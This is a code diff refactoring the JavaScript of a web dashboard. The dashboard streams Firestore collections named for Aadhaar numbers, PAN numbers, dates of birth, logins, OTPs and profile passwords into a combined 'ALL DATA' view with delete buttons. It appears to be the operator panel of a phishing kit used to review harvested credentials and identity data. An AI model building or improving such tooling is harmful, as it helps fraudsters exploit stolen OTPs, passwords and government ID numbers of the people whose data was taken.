@@ -156,8 +156,6 @@
       panel.innerHTML = "";
       buttonRow.innerHTML = "";
 
-      const allData = [];
-
       const topButtons = ['ALL_DATA', 'AADHAAR_ENTRIES', 'DOB_ENTRIES', 'LOGINS'];
       const bottomButtons = ['OTP_ENTRIES', 'PAN_ENTRIES', 'PROFILE_PASSWORDS'];
 
@@ -170,8 +168,7 @@
       };
 
       const showOnlySection = (id) => {
-        const sections = document.querySelectorAll(".section");
-        sections.forEach(sec => sec.classList.remove("active"));
+        document.querySelectorAll(".section").forEach(sec => sec.classList.remove("active"));
         const target = document.getElementById(id);
         if (target) target.classList.add("active");
       };
@@ -182,13 +179,10 @@
       const allSection = document.createElement("div");
       allSection.className = "section active";
       allSection.id = "all_data_section";
-      const allTitle = document.createElement("h2");
-      allTitle.textContent = "ALL DATA";
-      allSection.appendChild(allTitle);
-      const allContent = document.createElement("div");
-      allContent.id = "allDataContent";
-      allSection.appendChild(allContent);
+      allSection.innerHTML = "<h2>ALL DATA</h2><div id='allDataContent'></div>";
       panel.appendChild(allSection);
+
+      const allData = [];
 
       collections.forEach(col => {
         const section = document.createElement("div");
@@ -201,16 +195,17 @@
 
         const content = document.createElement("div");
         section.appendChild(content);
+        panel.appendChild(section);
 
         db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
           content.innerHTML = "";
-          snapshot.forEach(doc => {
-            const data = doc.data();
 
+          snapshot.docs.forEach(doc => {
+            const data = doc.data();
             const filteredData = {};
-            Object.keys(data).forEach(key => {
-              if (!['timestamp', '__collection', 'attempt', 'valid'].includes(key)) {
-                filteredData[key] = data[key];
+            Object.keys(data).forEach(k => {
+              if (!['timestamp', '__collection', 'attempt', 'valid'].includes(k)) {
+                filteredData[k] = data[k];
               }
             });
 
@@ -233,13 +228,11 @@
             entry.appendChild(delBtn);
             content.appendChild(entry);
 
-            allData.push({ ...filteredData, __collection: col });
+            allData.push({ ...filteredData, __collection: col, timestamp: data.timestamp });
             allData.sort((a, b) => b.timestamp?.seconds - a.timestamp?.seconds);
             renderAllData(allData);
           });
         });
-
-        panel.appendChild(section);
       });
     }
 
@@ -250,7 +243,9 @@
       dataArray.forEach(data => {
         const entry = document.createElement("div");
         entry.className = "entry";
-        entry.innerHTML = `<pre>[${data.__collection}]\n${JSON.stringify(data, null, 2)}</pre>`;
+        const display = { ...data };
+        delete display.timestamp;
+        entry.innerHTML = `<pre>[${data.__collection}]\n${JSON.stringify(display, null, 2)}</pre>`;
         allContent.appendChild(entry);
       });
     }
